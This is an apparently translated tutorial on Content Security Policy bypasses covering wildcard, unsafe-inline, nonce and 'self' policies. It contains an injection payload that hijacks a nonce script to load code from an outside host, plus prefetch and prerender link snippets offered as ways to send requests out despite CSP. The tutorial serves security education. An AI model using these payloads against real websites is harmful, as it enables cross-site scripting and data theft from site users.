#### CSP (Content Security Policy) is there / in-place to mitigate some attacks, such as xss, csrf. It behaves as a whitelist mechanism for resources loaded or executed on the website, and is defined by HTTP headers or meta elements.    

Although CSP provides strong security protection, it also causes the following problems: 

1. Eval and related functions are disabled     
2. Embedded JavaScript code will not be executed   
3. remote scripts can only be loaded through whitelisting    

Basically, there are not many xss vulnerabilities that are prone to exist on CSP, unless you insist on using 'unsafe-inline'. If the configuration is improper, even the website cannot be used normally) Otherwise, xss will be greatly reduced, and bypass CSP is more csrf that is not easy to be killed by csp.    

![Capture](https://user-images.githubusercontent.com/25066959/70393684-90aba180-19ba-11ea-9d42-6f2458c102c6.PNG)    
![Capture](https://user-images.githubusercontent.com/25066959/70393830-7672c300-19bc-11ea-9e65-685a7a01beb8.PNG)   
This causes XSS to fail.   
http://cspisawesome.com/ Mainly summarize how to bypass CSP but we'll go more in depth   

## Bypassing CSP 

### xxxx-src *
`header("Content-Security-Policy: script-src *;");`   
The * symbol indicates that all url-style requests are allowed except for inline functions, which can be referenced through src.    
![Capture](https://user-images.githubusercontent.com/25066959/70394292-e6377c80-19c1-11ea-9a37-aa42727ef928.PNG)   


![Capture](https://user-images.githubusercontent.com/25066959/70394300-fcddd380-19c1-11ea-9821-8e80a9bce7bd.PNG)   
![Capture](https://user-images.githubusercontent.com/25066959/70394537-0bc58580-19c4-11ea-8e0c-0d370f7cf846.PNG)   

Since people who want to use csp may not generally set it this way, the real problem is with the `frame-src *` that the same source problem leads to not being able to xss (bypassing the same source), but it can still be csrf.    

### script-src unsafe-inline
`header("Content-Security-Policy: default-src 'none';script-src http://lemon.love/test/csp/ 'unsafe-inline';");`    

If added `unsafe-inline`, it will not block inline code. Inline code includes: `<script> block content`, `inline events`, `inline style`    
For example, you want to load it `http://love.lemon/1.js`, but it is limited to `http://lemon.love/test/csp/it` .   
![Capture](https://user-images.githubusercontent.com/25066959/70394582-724aa380-19c4-11ea-857b-8ce24a4422e2.PNG)    
But you can execute inline scripts.    
![Capture](https://user-images.githubusercontent.com/25066959/70394593-94442600-19c4-11ea-8ef3-e0453597362b.PNG)     
The default-src 'none' is none, that is, other loading cannot be entered, and data cannot be sent out. Although none can cause the xss data to be unavailable, but the website is estimated to be unable to operate normally.     
![Capture](https://user-images.githubusercontent.com/25066959/70394606-b2aa2180-19c4-11ea-9550-8495d6d7c2b0.PNG)    
This is often referred to as `Using Browser Completion`    
Some websites restrict only certain scripts to be used, and often use `<script>` the nonce attribute of the tag. Only nonce consistent scripts take effect. For example, the CSP is set as follows:    
`Content-Security-Policy: default-src 'none';script-src 'nonce-abc'`
Then when the script insertion point is as follows   
```
<p>Insertion Point</p>
    <script id="aa" nonce="abc">document.write('CSP');</script>
```   
This will spell a new script tag, where the src can be set freely    
```
<p><script src=//14.rs a="</p>
    <script id="aa" nonce="abc">document.write('CSP');</script>
```
 
 
### xxxx-src self
self represents a homogeneous url, so there seems to be no way to load a remote url to get data.    
`header("Content-Security-Policy: default-src 'self';script-src http://lemon.love/test/csp/ 'unsafe-inline';style-src 'self' 'unsafe-inline'; img-src 'self'");`    
![Capture](https://user-images.githubusercontent.com/25066959/70394639-ec7b2800-19c4-11ea-9441-68cc6bf812da.PNG)   
When users access these pre-loaded documents, the browser can quickly fetch them from the cache.
Can be divided into: DNS-prefetch, subresource and standard prefetch, preconnect, prerender    
```
<!-Preload a page->
<link rel = 'prefetch' href = 'http: // xxxx'> <!-firefox->
<link rel = 'prerender' href = 'http: // xxxx'> <!-chrome->
<!-Preload a picture->
<link rel = 'prefetch' href = 'http: //xxxx/x.jpg'>
<!-DNS pre-resolution->
<link rel = "dns-prefetch" href = "http: // xxxx">
<!-Specific file type preloading->
<link rel = 'preload' href = '// xxxxx / xx.js'> <!-chrome->
```
Not all pages can be preloaded. When resource types are as follows, preload operations are blocked:     
1. URL contains download resources
2. Page contains audio and video
3. Ajax requests for POST, PUT and DELET operations
4. HTTP authentication
5. HTTPS page
6. Pages with malware
7. Popup page
8. Pages that take up a lot of resources
Opened chrome developer tools
 
 
 
 
 
 
 
 
 

